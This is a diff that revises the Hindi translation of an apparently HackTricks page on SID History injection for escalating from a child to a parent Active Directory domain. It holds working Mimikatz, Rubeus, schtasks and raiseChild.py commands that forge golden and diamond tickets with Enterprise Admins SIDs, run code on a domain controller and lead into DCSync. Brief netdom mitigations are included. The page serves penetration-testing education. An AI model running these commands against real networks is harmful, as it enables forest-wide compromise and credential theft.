@@ -4,15 +4,15 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack** का मुख्य उद्देश्य **domains के बीच user migration** में सहायता करना है, ताकि पुराने domain के resources तक निरंतर access बना रहे। यह नए account की **SID History** में user के पिछले Security Identifier (SID) को **शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके parent domain के किसी high-privilege group (जैसे Enterprise Admins या Domain Admins) की SID को SID History में जोड़ा जा सकता है। इससे parent domain के सभी resources तक access प्राप्त हो जाता है।<sup>[[1]](#references)[[2]](#references)</sup>
+**SID History Injection Attack** का मुख्य उद्देश्य **domains के बीच user migration** में सहायता करना है, ताकि पुराने domain के resources तक निरंतर access बना रहे। यह user के पिछले Security Identifier (SID) को उसके नए account की **SID History** में शामिल करके किया जाता है। विशेष रूप से, इस प्रक्रिया में parent domain के किसी उच्च-privilege group (जैसे Enterprise Admins या Domain Admins) का SID SID History में जोड़कर unauthorized access दिया जा सकता है। इस exploitation से parent domain के सभी resources तक access मिल जाता है।<sup>[[1]](#references)[[2]](#references)</sup>
 
 इस attack को execute करने के लिए दो methods मौजूद हैं: **Golden Ticket** या **Diamond Ticket** बनाकर।
 
-**"Enterprise Admins"** group की SID निर्धारित करने के लिए सबसे पहले root domain की SID खोजनी होगी। इसकी पहचान करने के बाद, root domain की SID के अंत में `-519` जोड़कर Enterprise Admins group की SID बनाई जा सकती है। उदाहरण के लिए, यदि root domain की SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" group की SID `S-1-5-21-280534878-1496970234-700767426-519` होगी।<sup>[[1]](#references)</sup>
+**"Enterprise Admins"** group का SID पता करने के लिए पहले root domain का SID ढूंढना आवश्यक है। इसकी पहचान के बाद, root domain के SID के अंत में `-519` जोड़कर Enterprise Admins group का SID बनाया जा सकता है। उदाहरण के लिए, यदि root domain SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" group का SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।<sup>[[1]](#references)</sup>
 
 आप **Domain Admins** groups का भी उपयोग कर सकते हैं, जिनका अंत **512** से होता है।
 
-किसी दूसरे domain के group (उदाहरण के लिए "Domain Admins") की SID खोजने का एक अन्य तरीका है:
+किसी अन्य domain के group (उदाहरण के लिए "Domain Admins") का SID ढूंढने का एक और तरीका है:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -22,9 +22,9 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 [**docs**](https://technet.microsoft.com/library/cc835085.aspx) के अनुसार:<sup>[[3]](#references)</sup>
 - netdom tool का उपयोग करके **forest trusts पर SIDHistory को disable करना** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
 - netdom tool का उपयोग करके **external trusts पर SID Filter Quarantining लागू करना** (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **एक ही forest के भीतर domain trusts पर SID Filtering लागू करना** recommended नहीं है, क्योंकि यह एक unsupported configuration है और breaking changes का कारण बन सकती है। यदि forest के भीतर कोई domain untrustworthy है, तो उसे forest का member नहीं होना चाहिए। इस स्थिति में पहले trusted और untrusted domains को अलग-अलग forests में split करना आवश्यक है, ताकि interforest trust पर SID Filtering लागू किया जा सके।
+- **एक ही forest के भीतर domain trusts पर SID Filtering लागू करना** recommended नहीं है, क्योंकि यह एक unsupported configuration है और breaking changes का कारण बन सकती है। यदि forest के भीतर कोई domain untrustworthy है, तो उसे forest का member नहीं होना चाहिए। इस स्थिति में पहले trusted और untrusted domains को अलग-अलग forests में split करना आवश्यक है, ताकि interforest trust पर SID Filtering लागू की जा सके।
 
-इसे bypass करने के बारे में अधिक जानकारी के लिए यह post देखें: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+इसे bypass करने के बारे में अधिक जानकारी के लिए यह post देखें: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) के साथ KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -61,7 +61,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Golden tickets के बारे में अधिक जानकारी के लिए देखें:
+अधिक जानकारी के लिए golden tickets देखें:
 
 
 {{#ref}}
@@ -69,7 +69,7 @@ golden-ticket.md
 {{#endref}}
 
 
-Diamond tickets के बारे में अधिक जानकारी के लिए देखें:
+अधिक जानकारी के लिए diamond tickets देखें:
 
 
 {{#ref}}
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-compromised domain के KRBTGT hash का उपयोग करके root के DA या Enterprise admin तक privilege escalate करें:
+compromised domain के KRBTGT hash का उपयोग करके root या Enterprise admin के DA तक privilege escalate करें:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Attack से प्राप्त permissions के साथ आप नए domain में, उदाहरण के लिए, DCSync attack execute कर सकते हैं:
+हमले से प्राप्त permissions के साथ आप नए domain में उदाहरण के लिए DCSync attack execute कर सकते हैं:
 
 
 {{#ref}}
@@ -123,19 +123,19 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) का उपयोग करके Automatic
 
-यह एक Impacket script है जो **child से parent domain तक escalating को automate करेगी**। Script को चाहिए:
+यह एक Impacket script है जो **child domain से parent domain तक escalating को automate करेगी**। Script को इनकी आवश्यकता होती है:
 
 - Target domain controller
-- child domain में admin user के Creds
+- child domain के किसी admin user के Creds
 
-Flow यह है:
+Flow इस प्रकार है:
 
-- parent domain के Enterprise Admins group के लिए SID प्राप्त करती है
-- child domain में KRBTGT account का hash प्राप्त करती है
-- Golden Ticket बनाती है
-- parent domain में लॉग इन करती है
-- parent domain में Administrator account के credentials प्राप्त करती है
-- यदि `target-exec` switch specified है, तो यह Psexec के माध्यम से parent domain के Domain Controller पर authenticate करती है।
+- parent domain के Enterprise Admins group के लिए SID प्राप्त करता है
+- child domain में KRBTGT account का hash प्राप्त करता है
+- एक Golden Ticket बनाता है
+- parent domain में Login करता है
+- parent domain में Administrator account के credentials प्राप्त करता है
+- यदि `target-exec` switch निर्दिष्ट किया गया है, तो यह Psexec के माध्यम से parent domain के Domain Controller के विरुद्ध authenticate करता है।
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
@@ -144,5 +144,6 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 - [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
 - [2] [Security Identifier (SID) क्या है? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 - [3] [Trusts के लिए Security Considerations - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Domains के बीच Security Boundary के रूप में SID Filter, भाग 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
